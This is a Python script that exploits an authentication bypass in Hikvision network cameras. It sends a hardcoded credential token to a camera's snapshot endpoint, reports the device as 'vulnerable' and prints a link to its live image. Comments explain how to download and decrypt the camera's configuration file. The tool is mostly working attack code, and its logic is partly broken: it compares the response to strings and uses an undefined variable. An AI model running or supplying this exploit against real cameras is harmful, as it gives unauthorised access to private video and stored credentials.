import requests
from functools import partial
import time, urllib


opener=urllib.request.build_opener()
opener.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582')]
urllib.request.install_opener(opener)

# HIK CAMERA INFO
#
# http://camera_ip/System/configurationFile?auth=YWRtaW46MTEK
#
# The config is encrypted with aes-128-ecb and XOR
#
#
# openssl enc -d -in configurationFile -out decryptedoutput -aes-128-ecb -K 73 8B 5544 -nosalt -md md5
#
# The output file then needs to be XOR-decrypted with 73 8B 55 44 as key.

server = input("Enter Camera IP (ex 2.186.xx.xx:80) : ")

url = f'http://{server}/onvif-http/snapshot?auth=YWRtaW46MTEK'

print(url)

try:
    response = requests.get(url)
except:
    print('   [ ~ ] Connection to '+server+' failed! Moving on.')

if response == ('404') or response == ('401'):
    print(f'   [ * ] Server '+{servers}+' is not vulnrable!'+(str(response)))
else:
    print('\n   [ ! ] Server '+server+' is vulnrable!   '+(str(response))+'\n')

    print('See a live snapshot of the camera here: \n\n'+url)
